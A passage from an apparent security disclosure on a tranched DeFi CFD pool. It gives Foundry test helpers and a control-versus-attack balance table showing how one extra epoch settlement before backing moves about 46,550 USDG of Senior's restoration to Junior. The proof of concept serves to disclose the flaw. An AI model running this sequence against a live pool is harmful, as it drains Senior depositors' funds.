        emit log_named_decimal_uint("SENIOR SHORTFALL against its waterfall entitlement (USDG)", shortfall, 6);
        assertGe(shortfall, revenue * 9 / 10, "Senior was not deprived of the revenue owed to it");
        assertGt(fin.j + fin.u, total - entitledSenior, "Junior/unassigned did not receive Senior's restoration");
        // The Senior LP's redeemable share value against what the waterfall entitles it to.
        uint256 seniorShareValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
        emit log_named_decimal_uint("Senior LP share value (USDG)", seniorShareValue, 6);
        assertLt(seniorShareValue + revenue * 9 / 10, entitledSenior, "Senior LP value not below entitlement");
    }

    // ------------------------------------------------------------------ scenario

    /// @dev Fully margined hedge at 1.00 inside the 40% skew cap; +60% at one 1% mark per trading day; longs added at
    ///      the top; winning shorts close (degraded latch, E < L); -61.25% at one 1% mark per trading day; longs close
    ///      and the payout above pool cash becomes a trader claim -> terminal LP deficit d. Then the owner runbook
    ///      (SECURITY.md "Explicit terminal-deficit cascade"): recapitalizePool(X), clearDegradedMode().
    function _crisisAndRunbook(
        uint256 recapMultBps
    ) internal returns (uint256 x, uint256 d) {
        uint256 t0 = vm.getBlockTimestamp();
        _fundTrader(SHORT_ACCOUNT, 1_330_000e6);
        _fundTrader(LONG_A, 830_000e6);
        _fundTrader(LONG_B, 500_000e6);
        // margin >= endpoint max profit: SHORT max profit = lots*CAP - entry = notional at 1.00; LONG = entry cost.
        _openAt(SHORT_ACCOUNT, CfdTypes.Side.SHORT, 430_000e18, 440_000e6);
        _openAt(LONG_A, CfdTypes.Side.LONG, 400_000e18, 410_000e6);
        _openAt(SHORT_ACCOUNT, CfdTypes.Side.SHORT, 430_000e18, 440_000e6);
        _openAt(LONG_A, CfdTypes.Side.LONG, 400_000e18, 410_000e6);
        _openAt(SHORT_ACCOUNT, CfdTypes.Side.SHORT, 430_000e18, 440_000e6);
        _assertNoCarryBase(SHORT_ACCOUNT);
        _assertNoCarryBase(LONG_A);

        (uint256 n, uint256 secs) = _dailyTickTo(TOP_PRICE);
        emit log_named_uint("up-leg: trading-day marks (<= 1% each)", n);
        emit log_named_uint("up-leg: calendar days", secs / 1 days);
        _openAt(LONG_B, CfdTypes.Side.LONG, 300_000e18, 490_000e6); // entry cost 480k at 1.60
        _assertNoCarryBase(LONG_B);
        _closeLeg(SHORT_ACCOUNT, CfdTypes.Side.SHORT, curPrice);
        assertTrue(engine.degradedMode(), "no degraded latch");

        (n, secs) = _dailyTickTo(BOTTOM_PRICE);
        emit log_named_uint("down-leg: trading-day marks (<= 1% each)", n);
        emit log_named_uint("down-leg: calendar days", secs / 1 days);
        _assertNoCarryBase(LONG_A);
        _assertNoCarryBase(LONG_B);
        _closeLeg(LONG_A, CfdTypes.Side.LONG, curPrice);
        _closeLeg(LONG_B, CfdTypes.Side.LONG, curPrice);
        assertEq(_maxLiability(), 0, "positions remain");
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 assets = pool.totalAssets();
        assertGt(claims, assets, "no terminal deficit");
        d = claims - assets;
        emit log_named_uint("crisis duration, calendar days", (vm.getBlockTimestamp() - t0) / 1 days);
        emit log_named_decimal_uint("terminal deficit d (trader claims above pool cash)", d, 6);

        x = (d * recapMultBps) / 10_000;
        settlementToken.mint(address(this), x);
        settlementToken.approve(address(engine), x);
        engine.recapitalizePool(x);
        engine.clearDegradedMode(); // E >= L restored (no open positions)
        emit log_named_decimal_uint("owner recapitalization X", x, 6);
    }

    /// @dev Ordinary losing LONG round trips until LP equity regains 80% of d, then one ordinary settlement.
    function _backingAndFinalSettle(
        uint256 d
    ) internal returns (Snap memory fin, uint256 revenue) {
        _fundTrader(REV_TRADER, 400_000e6);
        uint256 base = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 rounds;
        while (pool.totalAssets() - engine.totalTraderClaimBalanceAssets() < base + (d * 8) / 10 && rounds < 120) {
            // largest single-sided open the 40% skew cap admits, with a margin of safety
            _lossRound(((pool.totalAssets() - engine.totalTraderClaimBalanceAssets()) * 38) / 100);
            ++rounds;
        }
        revenue = pool.totalAssets() - engine.totalTraderClaimBalanceAssets() - base;
        emit log_named_uint("ordinary losing trades (backing)", rounds);
        emit log_named_decimal_uint("backing revenue R (USDG)", revenue, 6);
        IHousePool.LpEpochSettlementResult memory r = _ordinaryExit(LP_EXIT_D);
        fin = _snap("final, after the backing and one ordinary settlement");
        fin.j += r.juniorFundedAssets; // add back the exiting holder's own funded Junior exit
        fin.s += r.seniorFundedAssets;
    }

    /// @dev One ordinary losing LONG: open at the current mark, five +1% marks, close; then five -1% marks back.
    function _lossRound(
        uint256 notional
    ) internal {
        uint256 size = ((notional * 1e12 * 1e8 / curPrice) / 1e20) * 1e20;
        _openAt(REV_TRADER, CfdTypes.Side.LONG, size, notional / 10);
        for (uint256 i; i < 5; ++i) _step(true);
        _closeLeg(REV_TRADER, CfdTypes.Side.LONG, curPrice);
        for (uint256 i; i < 5; ++i) _step(false);
    }

    function _step(
        bool up
    ) internal {
        curPrice = up ? (curPrice * 101) / 100 : (curPrice * 99) / 100;
        vm.warp(vm.getBlockTimestamp() + TICK_INTERVAL);
        _refreshMark(curPrice);
    }

    function _dailyTickTo(
        uint256 target
    ) internal returns (uint256 n, uint256 secs) {
        uint256 t0 = vm.getBlockTimestamp();
        while (curPrice != target) {
            uint256 next = target > curPrice ? (curPrice * 101) / 100 : (curPrice * 99) / 100;
            if ((target > curPrice && next > target) || (target < curPrice && next < target)) next = target;
            curPrice = next;
            _nextTradingDay();
            _refreshMark(curPrice);
            ++n;
        }
        secs = vm.getBlockTimestamp() - t0;
    }

    function _nextTradingDay() internal {
        uint256 ts = vm.getBlockTimestamp();
        uint256 weekday = ((ts / 1 days) + 4) % 7; // 0 = Sunday ... 5 = Friday
        vm.warp(ts + (weekday == 5 ? 3 days : 1 days));
    }

    function _assertNoCarryBase(
        address account
    ) internal view {
        (uint256 borrowBase,,) = engine.positionCarryState(account);
        assertEq(borrowBase, 0, "position is not fully margined (carry would accrue)");
    }

    /// @dev An ordinary Junior holder requests its full balance; any keeper settles the matured epoch.
    function _ordinaryExit(
        address wallet
    ) internal returns (IHousePool.LpEpochSettlementResult memory r) {
        uint256 shares = juniorVault.balanceOf(wallet);
        vm.prank(wallet);
        uint256 requestId = juniorVault.requestRedeem(shares, wallet, wallet);
        _warpTo(pool.lpEpochStart(requestId) + 10);
        _refreshMark(curPrice);
        vm.prank(KEEPER);
        r = pool.settleLpEpoch(0, 0); // no open positions: permissionless
    }

    /// @dev The Junior holder and the Senior LP request their full balances in the same epoch; one keeper settlement.
    function _redeemBoth() internal returns (uint256 juniorUsdg, uint256 seniorUsdg) {
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // post-deposit cooldowns long passed; keep epochs distinct
        uint256 j0 = settlementToken.balanceOf(JUNIOR_LP);
        uint256 s0 = settlementToken.balanceOf(SENIOR_LP);
        uint256 jShares = juniorVault.balanceOf(JUNIOR_LP);
        uint256 sShares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 jr = juniorVault.requestRedeem(jShares, JUNIOR_LP, JUNIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 sr = seniorVault.requestRedeem(sShares, SENIOR_LP, SENIOR_LP);
        _warpTo(pool.lpEpochStart(jr) + 10);
        _refreshMark(curPrice);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
        uint256 sc = seniorVault.claimableRedeemRequest(sr, SENIOR_LP);
        assertEq(sc, sShares, "Senior redemption not fully funded");
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(sr, sc, SENIOR_LP, SENIOR_LP);
        uint256 jc = juniorVault.claimableRedeemRequest(jr, JUNIOR_LP);
        if (jc > 0) {
            vm.prank(JUNIOR_LP);
            juniorVault.claimRedeem(jr, jc, JUNIOR_LP, JUNIOR_LP);
        }
        juniorUsdg = settlementToken.balanceOf(JUNIOR_LP) - j0;
        seniorUsdg = settlementToken.balanceOf(SENIOR_LP) - s0;
    }

    function _seniorRequestsExit(
        uint256 bps
    ) internal returns (uint256 requestId) {
        if (seniorVault.maxRequestRedeem(SENIOR_LP) == 0) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
        uint256 shares = (seniorVault.balanceOf(SENIOR_LP) * bps) / 10_000;
        vm.prank(SENIOR_LP);
        requestId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
    }

    function _snap(
        string memory tag
    ) internal returns (Snap memory s) {
        s.s = pool.seniorPrincipal();
        s.h = pool.seniorHighWaterMark();
        s.j = pool.juniorPrincipal();
        s.u = pool.unassignedAssets();
        s.pending = pool.pendingRecapitalizationAssets();
        emit log(tag);
        emit log_named_decimal_uint("  senior principal", s.s, 6);
        emit log_named_decimal_uint("  senior HWM", s.h, 6);
        emit log_named_decimal_uint("  junior principal", s.j, 6);
        emit log_named_decimal_uint("  unassigned", s.u, 6);
        emit log_named_decimal_uint("  pending recapitalization", s.pending, 6);
    }

    function _report(
        uint256 x,
        uint256 d,
        Snap memory fin
    ) internal {
        uint256 total = fin.s + fin.j + fin.u;
        uint256 entitledSenior = x <= total ? x : total;
        emit log_named_decimal_uint("deficit d", d, 6);
        emit log_named_decimal_uint("recapitalization X (Senior's recovery target)", x, 6);
        emit log_named_decimal_uint("LP equity after backing (S + J + U)", total, 6);
        emit log_named_decimal_uint("ENTITLED Senior (min(X, S + J + U))", entitledSenior, 6);
        emit log_named_decimal_uint("ENTITLED Junior", total - entitledSenior, 6);
        emit log_named_decimal_uint("ACTUAL Senior", fin.s, 6);
        emit log_named_decimal_uint("ACTUAL Junior", fin.j, 6);
        emit log_named_decimal_uint("ACTUAL unassigned", fin.u, 6);
    }

    // ------------------------------------------------------------------ public-path helpers

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "deposit not activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) vm.warp(t);
    }

    function _openAt(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request.isClose = false;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(KEEPER, orderId, curPrice);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
        _refreshMark(curPrice);
    }

    function _closeLeg(
        address account,
        CfdTypes.Side side,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = _positionSize(account);
        request.marginDelta = 0;
        request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(account, orderId, price);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close failed");
        assertEq(_positionSize(account), 0, "leg not closed");
    }

    /// @dev Live v2.0.0 Router configuration, applied through the owner's 72 h timelocked config path.
    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = router.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        bytes[] memory tick = _ticks(price, publishTime, commitTime);
        vm.prank(keeper);
        result = router.executeOrder(orderId, tick);
    }

    function _ticks(
        uint256 price,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _nextBlock();
        router.updateMarkPrice(_ticks(price, vm.getBlockTimestamp(), engine.lastMarkTime()));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

}
```

</details>

### Observed balances:

| Measurement (USDG) | Control: no settlement before backing | Attack: one extra settlement before backing | Difference |
| --- | ---: | ---: | ---: |
| Terminal deficit `d` | 56,900.444682 | 56,900.444682 | 0 |
| Owner recapitalization `X` (Senior's principal-recovery target) | 113,709.848652 | 113,709.848652 | 0 |
| Senior high-water mark before backing | 113,709.848652 | 56,900.444682 | −56,809.403970 |
| Pending recapitalization before backing | 56,900.444682 | 91.040712 | −56,809.403970 |
| Backing revenue `R` | 46,642.392534 | 46,642.392534 | 0 |
| Senior principal after backing | 103,451.796504 | 56,900.444682 | −46,551.351822 |
| Junior principal after backing (incl. the funded small exit) | 0.000000 | 46,460.311110 | +46,460.311110 |
| Senior shortfall against its principal-restoration entitlement | 0 | 46,551.351822 | |
| **Junior holder USDG redeemed** | **0.000000** | **45,530.035820** | **+45,530.035820** |
| **Senior LP USDG redeemed** | **103,451.451131** | **56,901.293994** | **−46,550.157137** |

